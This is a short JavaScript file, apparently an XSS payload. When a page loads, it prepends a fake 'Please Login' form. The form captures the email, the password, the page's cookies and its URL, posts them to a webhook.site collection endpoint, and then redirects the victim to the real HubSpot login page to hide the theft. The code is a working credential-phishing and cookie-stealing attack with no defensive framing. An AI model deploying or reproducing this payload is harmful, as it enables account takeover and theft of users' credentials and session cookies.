// xss.js
document.addEventListener("DOMContentLoaded", function() {
  // Inject a fake login form
  const form = document.createElement("form");
  form.innerHTML = `
    <h3>Please Login</h3>
    <input type="email" name="email" placeholder="Email" required>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit">Login</button>
  `;
  form.style.cssText = "margin: 50px auto; width: 300px; padding: 20px; border: 1px solid #ccc;";

  // Capture form submissions
  form.addEventListener("submit", function(e) {
    e.preventDefault(); // Prevent default form submission
    const data = {
      email: this.email.value,
      password: this.password.value,
      cookies: document.cookie,
      url: window.location.href
    };
    
    // Send stolen data to your server
    fetch("https://webhook.site/38310abd-731f-4bb1-95aa-78d558225823", {
      method: "POST",
      body: JSON.stringify(data),
      mode: "no-cors"
    });

    // Optional: Redirect to real login page after stealing data
    window.location.href = "https://app.hubspot.com/login/";
  });

  document.body.prepend(form); // Add form at the top of the page
});
